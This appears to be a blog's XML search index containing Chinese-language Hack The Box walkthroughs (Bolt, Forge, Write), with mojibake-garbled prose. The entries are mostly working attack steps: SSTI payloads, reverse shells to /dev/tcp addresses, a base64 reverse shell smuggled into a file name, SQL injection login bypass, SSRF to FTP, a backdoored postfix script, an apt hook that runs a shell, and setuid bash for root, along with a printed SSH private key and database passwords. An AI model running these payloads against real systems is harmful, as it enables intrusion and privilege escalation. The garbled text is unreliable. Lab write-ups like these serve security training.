<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Bolt</title>
    <link href="/2021/10/20/Bolt/"/>
    <url>/2021/10/20/Bolt/</url>
    
    <content type="html"><![CDATA[<hr><pre><code>nmap -A -sS -sV 10.110.11.114</code></pre><p><img src="https://i.loli.net/2021/10/20/FWSfjkGhR9m62cK.png"></p><hr><pre><code>echo &quot;10.10.11.114 bolt.htb&quot; &gt;&gt; /etc/hosts</code></pre><hr><pre><code>æœ‰ä¸ªloginï¼Œåå“¥è¯­å½•ï¼Œæœ‰ç™»é™†çš„ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªç™»é™†ï¼Œä½†æ˜¯è¿™é‡Œåˆ›å»ºæ–°ç”¨æˆ·ä¼šå‡ºç°æœåŠ¡å™¨é”™è¯¯ï¼Œç¿»ä¸€ä¸‹ç½‘é¡µï¼Œå‘ç°ä¸€ä¸ªdownloadï¼Œçœ‹çœ‹èƒ½ ä¸‹è½½ä»€ä¹ˆæ–‡ä»¶ã€‚</code></pre><p><img src="https://i.loli.net/2021/10/20/OkgM7dmFc96e3uL.png"></p><hr><pre><code>gobuster vhost -u http://bolt.htb -t 30 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code></pre><p><img src="https://i.loli.net/2021/10/20/1wr5Y7VpsSZPhdm.png"></p><hr><pre><code>æ‰¾åˆ°ä¸€ä¸ªmail.bolt.htb echo &quot;10.10.11.114 mail.bolt.htb demo.bolt.htb&quot; &gt;&gt; /etc/hosts</code></pre><p><img src="https://i.loli.net/2021/10/20/G3ciLgRP81h6xoY.png"></p><p>ç¿»æ–‡ä»¶ç¿»åˆ°ä¸€ä¸ªæ•°æ®åº“æ–‡ä»¶ï¼Œç”¨kaliçš„å·¥å…·æ‰“å¼€<br><img src="https://i.loli.net/2021/10/20/MFpb2jBdVO36He4.png"></p><p>æ‰¾åˆ°äº†ä¸€ä¸ªhashå€¼ï¼Œç”¨johnæˆ–è€…hashcatå°è¯•ç ´è§£ä¸€ä¸‹<br><img src="https://i.loli.net/2021/10/20/CfuKYq6hnsR54lw.png"></p><hr><pre><code>deadbolt</code></pre><p><img src="https://i.loli.net/2021/10/20/n5GuS1ByRDkroAd.png"></p><p>å°è¯•sshç™»å½•ä¸€ä¸‹</p><p><img src="https://pic.imgdb.cnitem/61700aba2ab3f51d91d05db7.jpg"></p><p>å¤±è´¥äº†ï¼Œåœ¨å‰ç«¯ç™»å½•è¯•ä¸€ä¸‹ï¼ŒæˆåŠŸè¿›åˆ°äº†åå°ï¼Ÿ<br><img src="https://pic.imgdb.cn/item/61700ad42ab3f51d91d073aa.jpg"></p><p>ç»™äº†äº›ä¿¡æ¯ï¼Œdocker?è¦æˆ‘dockeré€ƒé€¸?  é‚®ä»¶ç³»ç»Ÿæœ‰é—®é¢˜?<br><img src="https://pic.imgdb.cn/item/61700ae92ab3f51d91d08585.jpg"></p><hr><pre><code>demoç½‘é¡µçš„é¡µè„š Flaskæ¡†æ¶  é‚®ä»¶ï¼Œwpåˆ©ç”¨SSTI https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti</code></pre><p><img src="https://pic.imgdb.cn/item/61700b0d2ab3f51d91d0a0a0.jpg"><br><img src="https://pic.imgdb.cn/item/61700b1a2ab3f51d91d0a9c0.jpg"><br><img src="https://pic.imgdb.cn/item/61700b2b2ab3f51d91d0b5ec.jpg"><br><img src="https://pic.imgdb.cn/item/61700b3a2ab3f51d91d0c0c6.jpg"></p><hr><pre><code>ç¡®è®¤SSTIæ¼æ´å­˜åœ¨ç”¨payload &#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()&#125;&#125;</code></pre><p><img src="https://pic.imgdb.cn/item/61700b452ab3f51d91d0cde4.jpg"></p><p>ä¿®æ”¹payloadåå¼¹shell </p><hr><pre><code>&#123;&#123;self._TemplateReference__context.cycler.__init__.__globals__.os.popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.28/1234 0>&1"').read()&#125;&#125;</code></pre><p>nc -nvlp 1234 ç»ˆäºæ¥äº†<br><img src="https://pic.imgdb.cn/item/61700b562ab3f51d91d0dc43.jpg"></p><p>ææƒ</p><hr><pre><code>grep &#39;bash&#39; /etc/passwd</code></pre><p><img src="https://pic.imgdb.cn/item/61700b602ab3f51d91d0e5d9.jpg"></p><hr><pre><code>cd /etc/passbolt ls -la cat passbolt.php</code></pre><hr><pre><code>&#39;Datasources&#39; =&gt; [         &#39;default&#39; =&gt; [             &#39;host&#39; =&gt; &#39;localhost&#39;,             &#39;port&#39; =&gt; &#39;3306&#39;,             &#39;username&#39; =&gt; &#39;passbolt&#39;,             &#39;password&#39; =&gt; &#39;rT2;jW7&lt;eY8!dX8&#125;pQ8%&#39;,             &#39;database&#39; =&gt; &#39;passboltdb&#39;,         ],  </code></pre><p>è¿æ¥æ•°æ®åº“å‘ç°ä¸¤ä¸ªè´¦æˆ·ï¼Œæˆ‘æƒ³é—®è¿™ä¸ªåœ¨ncé‡Œé¢è¿æ•°æ®åº“æ²¡å›æ˜¾è¯¥æ€ä¹ˆè§£å†³å•Šï¼Œæœ‰å¤§å“¥æœ‰çœ‹åˆ°ä¼šçš„æ•™æ•™æˆ‘<br><img src="https://pic.imgdb.cn/item/61700b6d2ab3f51d91d0f0ce.jpg"></p><hr><pre><code>å°è¯•æ•°æ®åº“å¯†ç ç™»å½•è¿™ä¸ªè´¦æˆ· su eddie rT2;jW7&lt;eY8!dX8&#125;pQ8%  python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; åœ¨å®¶ç›®å½•èƒ½æ‰¾åˆ°ç¬¬ä¸€ä¸ªflag</code></pre><p>åé¢çš„æ‰¾åˆ°ä¸€ä¸ªPGPåŠ å¯†çš„ï¼Œwpå«è½¬hashç„¶åè§£ã€‚å®åœ¨ç©ä¸æ¥äº†ï¼Œæ‹œæ‹œäº†æ‚¨å‹’ï¼Œwpæˆ‘è¿™æœ‰ä¸ªè‹±æ–‡pdfï¼Œéœ€è¦çš„åŠ å¾®ä¿¡</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Forge</title>
    <link href="/2021/10/20/Forge/"/>
    <url>/2021/10/20/Forge/</url>
    
    <content type="html"><![CDATA[<p>curl 10.10.11.111  ç«ç‹è¿›ä¸å»ï¼Œcurlçœ‹ä¸€ä¸‹ï¼Œå‘ç°äº†ä¸€ä¸ªåŸŸåï¼Œ<br>æŠŠä»–æ·»åŠ åˆ°hostsæ–‡ä»¶é‡Œ</p><hr><pre><code>echo &quot;10.10.11.111 forge.htb&quot; &gt;&gt; /etc/hosts</code></pre><p><img src="https://i.loli.net/2021/10/20/9nvJKQReBXVdbhm.png"></p><p>æ‰“å¼€ç½‘é¡µé•¿è¿™æ ·<br><img src="https://i.loli.net/2021/10/20/MeHnTIcZsqYyECf.png"></p><p>æœ‰ä¸€ä¸ªä¸Šä¼ çš„åœ°æ–¹ï¼ŒæŠ“åŒ…ï¼Œå°è¯•æŠ“åŒ…ä¸Šä¼ ä¸€ä¸‹ã€‚<br><img src="https://i.loli.net/2021/10/20/zshCMjN9A4f8Toe.png"><br><img src="https://i.loli.net/2021/10/20/wFxkscfQ2LhECl3.png"></p><p>ä¸Šä¼ çš„ä¸€å¼ å›¾ç‰‡æ˜¾ç¤ºæ˜¯ä¸Šä¼ æˆåŠŸï¼Œä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå°±ä¸èƒ½è®¿é—®äº†ï¼Œä¹Ÿä¸çŸ¥é“è¿™ä¸ªèƒ½è§£æä»€ä¹ˆï¼Œ å°è¯•ç›®å½•æ‰«æå’Œå­åŸŸåæ‰«æï¼Œå› ä¸ºè¿™ä¸ªç½‘ç«™ä¸æ˜¯è¿˜æœ‰ä¸€ä¸ªupload from urlå—</p><hr><pre><code>wfuzz -c -u &quot;http://forge.htb/&quot; -H &quot;Host:FUZZ.forge.htb&quot; -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt</code></pre><hr><pre><code>gobuster vhost -u forge.htb -w /usr/share/amass/wordlists/subdomains-top1mil-5000.txt</code></pre><p>æ‰«åˆ°ä¸€ä¸ªadmin.forge.htb<br><img src="https://i.loli.net/2021/10/20/EZRtagLr4uzOTXv.png"></p><hr><pre><code>echo &quot;10.10.11.111 admin.forge.htb&quot; &gt;&gt; /etc/hosts</code></pre><p>è®¿é—®ä¸€ä¸‹ï¼Œåªå…è®¸æœ¬åœ°è®¿é—®ï¼Œå°è¯•è¿ªå“¥æ•™çš„åŠ ä¸€ä¸ªX-Forwarded-For:127.0.0.1 çœ‹çœ‹èƒ½ä¸èƒ½ç»•è¿‡<br><img src="https://i.loli.net/2021/10/20/IQGZsJe8DL9xNvz.png"></p><p>ç„¶é¹…ã€‚ã€‚<br><img src="https://i.loli.net/2021/10/20/mK1CQxPMpksvVBF.png"></p><p>å°è¯•æŠŠä»–å­åŸŸä¸Šä¼ ä¸Šå»ï¼Œé»‘åå•ï¼Œè¿˜å¥½ä¸æ˜¯ç™½åå•ï¼Œå°è¯•å¤§å°å†™ç»•è¿‡<br><img src="https://i.loli.net/2021/10/20/zFrXCGkBgoqYhnl.png"></p><p>æ”¹äº†ä¸€ä¸ªå¤§å†™ï¼ŒæˆåŠŸäº†ï¼Œè®¿é—®ä¸äº†ï¼Œcurl è¿˜æ˜¯åŸæ¥é¡µé¢ï¼Œwpçš„ç»•è¿‡æˆåŠŸäº† <a href="http://admin.forge.htb/">http://aDmin.forGe.hTb/</a><br><img src="https://i.loli.net/2021/10/20/E1sivHjJMlCkYwp.png"></p><p>è®¿é—®å›¾åƒæŸåï¼Œcurlçœ‹æŠ¥æ–‡/announcement<br><img src="https://i.loli.net/2021/10/20/g3dXhHfBm97142t.png"></p><hr><pre><code>http://aDmin.forGe.hTb/announcement</code></pre><hr><pre><code>å¥½ä¸œè¥¿æ¥äº†ï¼Œç»™äº†ä¸€ä¸ªftpå¸å¯†ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªssrfï¼Œåˆ©ç”¨ä¸€ä¸‹ user:heightofsecurity123!</code></pre><hr><pre><code>ç¿»è¯‘: ä¸€ä¸ªæˆ‘nternal FTPæœåŠ¡å™¨å·²ç»åˆ›å»ºäº†å‡­æ®ç”¨æˆ·ï¼šheightofsecuirty123ï¼ /upload ç«¯ç‚¹ç°åœ¨æ”¯æŒç”¨äºä¸Šä¼ è¡¨å• url çš„ ftpã€ftpsã€http å’Œ https åè®® /upload ç«¯ç‚¹å·²ç»è¢«é…ç½®ä¸ºç®€å•çš„ä¸Šä¼ è„šæœ¬ï¼Œå¹¶ä¸”ä¸ºäº†ä¸Šä¼ å›¾åƒï¼Œå¯ä»¥ç®€å•åœ°ä¼ é€’ä¸€ä¸ªå¸¦æœ‰ ?u= çš„ urlã€‚ ä»¥å…å°è¯•é€šè¿‡å°† get param ä¸­çš„ ftp url ä¼ é€’ç»™ admin vhost æ¥è®¿é—® ftp</code></pre><p><img src="https://i.loli.net/2021/10/20/pSwnc683gHtK1rD.png"></p><hr><pre><code>åˆ©ç”¨ http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB</code></pre><p><img src="https://i.loli.net/2021/10/20/AUKyN8gWt742Dkr.png"></p><p>è¯»/.ssh/id_rsa</p><hr><pre><code>-----BEGIN OPENSSH PRIVATE KEY----- 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 shlLupso7WoS0AAAAKdXNlckBmb3JnZQE= -----END OPENSSH PRIVATE KEY-----</code></pre><hr><pre><code>æˆåŠŸè¯»åˆ°ï¼Œ chmod 600 user_id_rsa ssh -i user_id_rsa user@10.10.11.111         ç”¨æˆ·ç”¨çš„ftpçš„ç”¨æˆ·å è¿æ¥æˆåŠŸ</code></pre><p>sudo -l å‘ç°ä¸€ä¸ªpythonæ–‡ä»¶</p><hr><pre><code>#!/usr/bin/env python3 import socket import random import subprocess import pdb  port = random.randint(1025, 65535)  try:     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)     sock.bind((&#39;127.0.0.1&#39;, port))     sock.listen(1)     print(f&#39;Listening on localhost:&#123;port&#125;&#39;)     (clientsock, addr) = sock.accept()     clientsock.send(b&#39;Enter the secret passsword: &#39;)     if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;:         clientsock.send(b&#39;Wrong password!\n&#39;)     else:         clientsock.send(b&#39;Welcome admin!\n&#39;)         while True:             clientsock.send(b&#39;\nWhat do you wanna do: \n&#39;)             clientsock.send(b&#39;[1] View processes\n&#39;)             clientsock.send(b&#39;[2] View free memory\n&#39;)             clientsock.send(b&#39;[3] View listening sockets\n&#39;)             clientsock.send(b&#39;[4] Quit\n&#39;)             option = int(clientsock.recv(1024).strip())             if option == 1:                 clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode())             elif option == 2:                 clientsock.send(subprocess.getoutput(&#39;df&#39;).encode())             elif option == 3:                 clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode())             elif option == 4:                 clientsock.send(b&#39;Bye\n&#39;)                 break except Exception as e:     print(e)     pdb.post_mortem(e.__traceback__) finally:     quit()</code></pre><p>ä»£ç æ˜¯ç¡¬ä¼¤ï¼Œwpæ˜¯è¿™ä¹ˆå†™çš„</p><hr><pre><code>æˆ‘ä»¬å¯ä»¥æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œå¦‚æœæˆ‘ä»¬è®¾æ³•åˆ›å»ºäº†ä¸€äº›é”™è¯¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬è½¬åˆ° Python è°ƒè¯•å™¨ä¸­çš„ except å¤„ç†ç¨‹åºï¼Œ å› ä¸ºæˆ‘ä»¬ä»¥ root èº«ä»½è¿è¡Œå®ƒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°ä½¿ç”¨ç³»ç»Ÿä¸­çš„ os æ¨¡å—æ‰§è¡Œå‘½ä»¤ã€‚ ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ä¸ª ssh è¿æ¥ä¸€ä¸ªç”¨äºå¯åŠ¨æœåŠ¡å™¨ï¼Œç¬¬äºŒä¸ªç”¨äºè¿æ¥åˆ°æœåŠ¡å™¨ã€‚</code></pre><hr><pre><code>ssh1ï¼š sudo /usr/bin/python3 /opt/remote-manage.py ssh2ï¼š nc 127.0.0.1 è¾“å…¥å“ªé‡Œç»™çš„ç«¯å£ ls  ssh1 è¿›å…¥pdp (Pdb) import os (Pdb) os.system(&#39;chmod u+s /bin/bash&#39;) (Pdb)exit /bin/bash -p rootæƒé™æ¥äº†ã€‚åœ¨/root/root.txtæ‰¾åˆ°flag</code></pre><p><img src="https://i.loli.net/2021/10/20/ZSq3ec8vYxPnbsE.png"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Write</title>
    <link href="/2021/10/18/Hach%20The%20Box-Write/"/>
    <url>/2021/10/18/Hach%20The%20Box-Write/</url>
    
    <content type="html"><![CDATA[<hr><pre><code>nmap -A -sS -sV 10.10.11.101 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA) |   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA) |_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519) 80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Story Bank | Writer.HTB 139/tcp open  netbios-ssn Samba smbd 4.6.2 445/tcp open  netbios-ssn Samba smbd 4.6.2</code></pre><p><img src="https://pic.imgdb.cn/item/616d35282ab3f51d91bc8801.jpg"></p><p>æ‰«æå™¨å¹²ä»–</p><hr><pre><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/</code></pre><hr><pre><code>http://10.10.11.101/static/   ä¸€ä¸ªç›®å½•éå† http://10.10.11.101/administrative   ä¸€ä¸ªåå°ï¼Œå¥½åƒä¹Ÿä¸æ˜¯cms ï¼Œè¿™ç§æ¡æ¡æ¡†æ¡†çš„ç”¨å¼±å£ä»¤å’Œæ³¨å…¥æµ‹ä¸€ä¸‹</code></pre><p>ç™»å½•å“ªé‡ŒæŠ“åŒ…ï¼Œè·‘åˆ°ä¸€ä¸ªæ³¨å…¥ï¼Œç™»å½•æ¡†çš„æ³¨å…¥ï¼Œä¸€èˆ¬åº”è¯¥è¿˜æœ‰ä¸‡èƒ½å¯†ç ç™»å½•</p><hr><pre><code>è·‘ä¸ªä¸‡èƒ½å¯†ç çš„å­—å…¸åº”è¯¥ä¹Ÿèƒ½è¿› admin &#39; or &#39;1&#39;=&#39;1 admin &#39; or &#39;1&#39;=&#39;1 ç™»å½•æˆåŠŸ</code></pre><p><img src="https://pic.imgdb.cn/item/616d352c2ab3f51d91bc8a96.jpg"></p><p>sqlmapè¯´æœ‰6ä¸ªå­—æ®µï¼Œ testâ€™ union select 1,2,3,4,5,6;â€“+çˆ†æ˜¾ç¤ºä½<br><img src="https://pic.imgdb.cn/item/616d35312ab3f51d91bc8d3c.jpg"></p><p>è¯»å–/etc/passwdæ–‡ä»¶<br><img src="https://pic.imgdb.cn/item/616d35332ab3f51d91bc8ef8.jpg"></p><p>è¿›å…¥åå°ç¿»ä¸€ä¸‹ï¼Œå‘ç°æœ‰ä¸Šä¼ æ–‡ä»¶çš„åŠŸèƒ½ï¼Œä½†æ˜¯åªèƒ½ä¸Šä¼ å›¾ç‰‡ï¼Œ</p><hr><pre><code>ç”¨kaliåšä¸€ä¸ªå›¾ç‰‡é©¬  echo -n &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/1234 0&gt;&amp;1&quot;&#39; | base64 å¾—åˆ°ä¸€ä¸ªbase64 L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==  touch &#39;1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;&#39;  file:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTIzNCAwPiYxIg==| base64 -d | bash`;#</code></pre><p><img src="https://pic.imgdb.cn/item/616d35392ab3f51d91bc9273.jpg"></p><p>åœ¨homeä¸‹lså‘ç°ä¸¤ä¸ªè´¦æˆ· john kyle</p><hr><pre><code>ä¹å¤´è›‡è·‘å¯†ç  hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh</code></pre><hr><pre><code>è¿›æ•°æ®åº“æ‹¿kyleçš„hash,å…ˆæ‹¿æ•°æ®åº“çš„è´¦å·å’Œå¯†ç  cd /etc/mysql cat mariadb.cnf  æ‹¿åˆ°å¯†ç ç™»å½•mysql user = djangouser password = DjangoSuperPassword</code></pre><p><img src="https://pic.imgdb.cn/item/616d353d2ab3f51d91bc9679.jpg"></p><hr><pre><code>mysql -u djangouser -h 127.0.0.1 -p DjangoSuperPassword     show databases; use dev; show tables; SELECT * FROM auth_user; æ‹¿åˆ°hashå€¼å»hashcatæˆ–johnçˆ†ç ´å¿˜äº†æˆªå›¾äº†ã€‚ã€‚</code></pre><hr><pre><code>kyle marcoantonio ssh kyle@10.10.11.101</code></pre><p><img src="https://pic.imgdb.cn/item/616d35412ab3f51d91bc9a6c.jpg"></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><hr><pre><code>å‡†å¤‡ä¸¤ä¸ªè„šæœ¬python -m SimpleHTTPServer 80 ä¼ ä¸Šå»</code></pre><hr><pre><code>#!/bin/bash# Localize these.bash -i &amp;&gt;/dev/tcp/10.10.14.14/4444 0&gt;&amp;1INSPECT_DIR=/var/spool/filterSENDMAIL=/usr/sbin/sendmail# Get disclaimer addressesDISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses# Exit codes from &lt;sysexits.h&gt;EX_TEMPFAIL=75EX_UNAVAILABLE=69# Clean up when done or when aborting.trap &quot;rm -f in.$$&quot; 0 1 2 3 15# Start processing.cd $INSPECT_DIR || &#123; echo $INSPECT_DIR does not exist; exit$EX_TEMPFAIL; &#125;cat &gt;in.$$ || &#123; echo Cannot save mail to file; exit $EX_TEMPFAIL; &#125;# obtain From addressfrom_address=`grep -m 1 &quot;From:&quot; in.$$ | cut -d &quot;&lt;&quot; -f 2 | cut -d &quot;&gt;&quot; -f 1`if [ `grep -wi ^$&#123;from_address&#125;$ $&#123;DISCLAIMER_ADDRESSES&#125;` ]; then  /usr/bin/altermime --input=in.$$ \                   --disclaimer=/etc/postfix/disclaimer.txt \                   --disclaimer-html=/etc/postfix/disclaimer.txt \                   --xheader=&quot;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm&quot; || \                    &#123; echo Message content rejected; exit $EX_UNAVAILABLE; &#125;fi$SENDMAIL &quot;$@&quot; &lt;in.$$exit $?</code></pre><p>è¿™æ˜¯ä¿®æ”¹åŸæ–‡ä»¶/etc/postfix/disclaimeråå¾—åˆ°çš„è„šæœ¬ï¼Œè¿™é‡Œåªæ˜¯ä¸¾ä¸ªä¾‹å­ï¼Œè¯¥é¶æœºæ— æ³•ä½¿ç”¨bashå’Œshè¿›è¡Œåå¼¹ shellã€‚å¯ä»¥ä½¿ç”¨pythonæˆ–socatè¿›è¡Œgetshellï¼Œç”±äºæ‡’ï¼Œæˆ‘å°±ä¸ä¿®æ”¹äº† æŸ¥çœ‹æ–‡ä»¶/etc/postfix/disclaimer_addresseså¾—åˆ°é‚®ç®±<a href="mailto:&#107;&#121;&#x6c;&#101;&#64;&#x77;&#114;&#105;&#116;&#x65;&#x72;&#x2e;&#x68;&#x74;&#x62;">&#107;&#121;&#x6c;&#101;&#64;&#x77;&#114;&#105;&#116;&#x65;&#x72;&#x2e;&#x68;&#x74;&#x62;</a> ä½¿ç”¨è¯¥é‚®ç®±ç¼–å†™è„šæœ¬</p><hr><pre><code>import smtplibhost = &#39;127.0.0.1&#39;port = 25sender_email = &quot;kyle@writer.htb&quot;receiver_email = &quot;kyle@writer.htb&quot;message = &quot;&quot;&quot;\Subject: Hi thereTest_python_sender.&quot;&quot;&quot;try:    server = smtplib.SMTP(host, port)    server.ehlo()    server.sendmail(sender_email, receiver_email, message)except Exception as e:    print(e)finally:    server.quit()</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d354c2ab3f51d91bca4bb.jpg"></h2><pre><code>è®¿é—®/home/john/.sshæ–‡ä»¶æ‹¿åˆ°id_rsa kaliæœ¬åœ°åˆ›å»ºid_rsaå¤åˆ¶å†…å®¹ chmod 600 id_rsa   ssh -i id_rsa john@10.10.11.101</code></pre><hr><pre><code>ææƒå‚è€ƒï¼šhttps://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</code></pre><p><img src="https://pic.imgdb.cn/item/616d39622ab3f51d91bfd97f.jpg"></p><hr><pre><code>cd /etc/apt/apt.conf.d  echo &#39;apt::Update::Pre-Invoke &#123;&quot;echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTQvMTAwODYgMD4mMSI= | base64 -d | bash&quot;&#125;;&#39;&gt; pwn base64ï¼š/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.14/10086 0&gt;&amp;1&quot; nc -nvlp 10086  å¤šç­‰ä¼šå„¿ï¼Œrootæƒé™å°±æ¥äº†æœ€åä¸€ä¸ªåœ¨rootä¸‹ cat root.txtå°±è¡Œäº†</code></pre><p><img src="https://pic.imgdb.cn/item/616d396b2ab3f51d91bfe01a.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Seal</title>
    <link href="/2021/10/18/Hach%20The%20Box-Seal/"/>
    <url>/2021/10/18/Hach%20The%20Box-Seal/</url>
    
